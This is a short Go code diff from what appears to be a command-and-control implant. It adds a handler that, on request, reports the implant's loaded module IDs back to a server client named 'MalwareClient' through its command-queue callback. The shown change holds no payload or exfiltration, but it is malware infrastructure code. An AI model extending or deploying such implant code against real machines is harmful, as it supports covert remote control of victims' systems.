@@ -42,8 +42,6 @@ func (settings settings) doConnection() {
 		return // Its a heartbeat so don't do anything
 	}
 
-	handled := false
-
 	callback := func(reply *messages.ImplantReply) {
 		client := pb.NewMalwareClient(settings.state.conn)
 		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
@@ -51,6 +49,17 @@ func (settings settings) doConnection() {
 
 		client.CheckCommandQueue(ctx, &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}})
 	}
+
+	if reply.GetListmodules() != nil {
+		modules := ""
+		for _, module := range included_modules.Modules {
+			modules += module.ID() + " "
+		}
+		callback(&messages.ImplantReply{Module: "list", Args: []byte(modules)})
+		return // Return modules
+	}
+
+	handled := false
 
 	for _, module := range included_modules.Modules {
 		handled = handled || module.HandleMessage(reply, callback)
